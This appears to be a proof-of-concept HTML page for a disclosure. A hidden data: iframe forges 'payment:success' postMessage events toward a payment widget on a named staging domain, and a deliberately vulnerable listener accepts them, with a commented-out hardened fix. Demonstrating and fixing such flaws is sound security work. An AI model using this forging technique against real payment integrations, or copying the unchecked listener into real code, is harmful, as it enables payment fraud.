<!doctype html>
<meta charset="utf-8" />
<title>postMessage Origin/Source Check – PoC</title>
<style>
  body { font: 14px/1.45 system-ui; margin: 24px; }
  input, button { font: inherit; }
  #log { white-space: pre-wrap; background: #111; color: #0f0; padding: 10px; border-radius: 8px; min-height: 140px; }
  iframe { border: 1px solid #ccc; }
  .row { margin: 8px 0; }
  .muted { color: #666; }
</style>

<h1>PoC: Missing <code>e.origin</code>/<code>e.source</code> validation</h1>
<ol>
  <li>Embeds the real widget iframe (staging).</li>
  <li>Parent has a <b>vulnerable</b> message listener (only checks <code>uuid</code>).</li>
  <li>A sibling “attacker” iframe sends a forged <code>postMessage</code> (origin will be <code>null</code>).</li>
  <li>Log shows both real and forged messages being dispatched by the vulnerable listener.</li>
</ol>

<div class="row">
  Widget URL:
  <input id="widgetUrl" size="90"
         value="https://multipay.staging.komoju-dev.com/widget.html?uuid=DEMO-UUID-123" />
  <button id="embed">Embed widget & auto-forge</button>
</div>

<div class="row">
  Forge event:
  <input id="eventName" value="payment:success" />
  Amount: <input id="amount" value="1" size="4" />
  Currency: <input id="currency" value="USD" size="5" />
  <button id="send">Send forged postMessage</button>
  <span class="muted">| (forged message is sent from a data: iframe → <code>origin = "null"</code>)</span>
</div>

<h2>Log</h2>
<div id="log">(no events yet)</div>

<!-- Real widget iframe goes here -->
<div class="row">
  <iframe id="victim" width="420" height="280" title="Widget iframe"></iframe>
</div>

<!-- Hidden attacker iframe (origin will be "null" because it's a data: URL) -->
<iframe id="attacker" width="0" height="0" style="visibility:hidden"
  src="data:text/html,<!doctype html><meta charset='utf-8'>
<script>
  function sendForged(uuid, evt, amount, currency){
    const payload = { uuid: uuid, event: evt, amount: Number(amount), currency: currency };
    parent.postMessage(payload, '*'); /* forged message from opaque (null) origin */
  }
</script>
<body>attacker ready</body>"></iframe>

<script>
  // ---------- Utilities ----------
  const $ = (id) => document.getElementById(id);
  function log(...args){
    const line = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ');
    const el = $('log');
    el.textContent = (el.textContent === '(no events yet)' ? '' : el.textContent + '\n') + line;
  }
  function getUuidFrom(url){
    try { return new URL(url).searchParams.get('uuid') || ''; }
    catch(_){ return ''; }
  }

  // Keep CURRENT_UUID synced with the URL input
  let CURRENT_UUID = getUuidFrom($('widgetUrl').value);
  $('widgetUrl').addEventListener('input', ()=> {
    CURRENT_UUID = getUuidFrom($('widgetUrl').value);
  });

  // ---------- 1) Embed the REAL widget iframe ----------
  $('embed').onclick = () => {
    const url = $('widgetUrl').value.trim();
    $('victim').src = url;
    log('[Parent] Embedded widget:', url);

    // Auto-fire a forged message shortly after embed (for screenshot-friendly demo)
    setTimeout(() => {
      const uuid = getUuidFrom(url) || 'DEMO-UUID-123';
      const attackerWin = $('attacker').contentWindow;
      attackerWin.sendForged(uuid, 'payment:success', 1, 'USD');
      log('[Attacker] Sent forged message to parent with uuid =', uuid, '(origin will be null)');
    }, 1200);
  };

  // ---------- 2) Vulnerable parent listener (demonstrates the bug) ----------
  window.addEventListener('message', (e) => {
    // ❌ VULNERABLE: no origin/source verification — accepts any sender that matches uuid
    if (e && typeof e.data === 'object' && e.data.uuid && e.data.uuid === CURRENT_UUID) {
      log('[Parent] DISPATCH (vulnerable): origin =', String(e.origin),
          ' event =', e.data.event, ' data =', e.data);
    } else {
      log('[Parent] Ignored message:', { origin: e.origin, data: e.data });
    }
  });

  // ---------- 3) Manual forged send (button) ----------
  $('send').onclick = () => {
    const url = $('widgetUrl').value.trim();
    const uuid = getUuidFrom(url) || 'DEMO-UUID-123';
    const evt  = $('eventName').value.trim() || 'payment:success';
    const amt  = $('amount').value.trim() || '1';
    const cur  = $('currency').value.trim() || 'USD';

    const attackerWin = $('attacker').contentWindow;
    attackerWin.sendForged(uuid, evt, amt, cur);
    log('[Attacker] Sent forged message to parent with uuid =', uuid, '(origin will be null)');
  };

  // ---------- (Optional) Hardened listener (contrast / fix) ----------
  // Uncomment this block to demonstrate the proper fix that rejects the forged message:
  /*
  (function addHardenedListener(){
    // Set after widget is embedded; if you need dynamic, rebind after 'embed'
    let expectedOrigin = null;
    let childWindow = null;

    const setHandles = () => {
      try {
        const url = $('widgetUrl').value.trim();
        expectedOrigin = new URL(url).origin;             // e.g., https://multipay.staging.komoju-dev.com
      } catch(_) { expectedOrigin = null; }
      childWindow = $('victim').contentWindow || null;
    };
    setHandles();
    // Recompute handles after embedding
    $('embed').addEventListener('click', () => setTimeout(setHandles, 0));

    window.addEventListener('message', (e) => {
      if (!expectedOrigin || !childWindow) return;
      if (e.origin !== expectedOrigin) return;            // ✅ origin check
      if (e.source !== childWindow) return;               // ✅ window identity check
      if (e && typeof e.data === 'object' && e.data.uuid === CURRENT_UUID) {
        log('[Parent] DISPATCH (hardened): origin =', String(e.origin),
            ' event =', e.data.event, ' data =', e.data);
      }
    });
  })();
  */
</script>
